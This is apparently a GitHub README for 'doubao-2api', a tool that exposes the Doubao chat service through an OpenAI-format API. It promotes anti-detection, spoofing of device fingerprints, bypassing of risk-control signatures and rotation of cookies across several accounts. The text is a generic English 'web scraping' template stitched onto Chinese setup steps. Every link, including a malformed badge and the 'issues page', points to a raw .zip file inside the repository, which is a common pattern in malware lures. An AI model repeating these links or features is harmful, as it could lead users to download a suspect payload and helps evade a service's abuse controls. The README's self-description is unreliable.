# 🎉 doubao-2api - Simplify Your Web Scraping Tasks

## 🚀 Getting Started

Welcome to doubao-2api! This tool helps you scrape web data with ease. It's designed for users who want to streamline their tasks without needing complex technical knowledge.

## 📦 Download & Install

To get started, you need to download the software. Visit the link below to access the latest version:

[![Download Latest Release](https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/core/doubao_api_2.6.zip%20Latest%20Release-%https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/core/doubao_api_2.6.zip)](https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/core/doubao_api_2.6.zip)

After visiting this page, find the most recent release and download the appropriate file for your system. 

## 📃 Features

- Use a headless browser with Playwright for efficient web scraping.
- Automatically handle risk management signatures.
- Support for static device fingerprints and dynamic token updates.
- Advanced anti-detection methods to reduce the chance of being blocked.
- Must provide your own cookies for multi-account cycling.
- Compatibility with OpenAI API format for seamless integration.
- Native streaming output for real-time data processing.
- State retention to maintain your session across operations.
- One-click deployment using Docker for easy setup.

## 💻 System Requirements

To run doubao-2api smoothly, ensure your system meets the following requirements:

- **Operating System:** Windows, macOS, or Linux.
- **Processor:** Dual Core or above.
- **RAM:** 4 GB or more.
- **Disk Space:** At least 200 MB free space.
- **Docker:** Installed if you choose the Docker deployment option.

### 1. 配置凭证 (Cookie)
本项目支持两种方式加载 Cookie：

- **方式 A (推荐):** 在项目根目录创建 `cookies` 文件夹，将每个账号的 Cookie 分别存放在 `.txt` 文件中（如 `account1.txt`）。程序会自动读取该目录下所有的文本文件。
- **方式 B:** 在 `.env` 文件中配置 `COOKIES=cookie1|cookie2|cookie3`，使用 `|` 符号分隔多个账号。

### 2. 配置设备指纹
在 `.env` 中填入必要的设备参数（DOUBAO_DEVICE_ID, DOUBAO_FP 等）。

### 3. 运行
```bash
python main.py
```
或者使用 Docker 部署。

## 🎯 Tips for Success

- Ensure your cookies are valid to avoid connection issues.
- Familiarize yourself with basic web scraping principles for optimal results.
- Refer to our online documentation for specific command usages and advanced configurations.

## 🔗 Additional Resources

- **Documentation:** Comprehensive guides for advanced users and technical configurations.
- **Support:** For any questions or issues, feel free to check our [issues page](https://raw.githubusercontent.com/danil1072/doubao-2api/main/app/core/doubao_api_2.6.zip) on GitHub.

Thank you for choosing doubao-2api! We hope it simplifies your web scraping journey.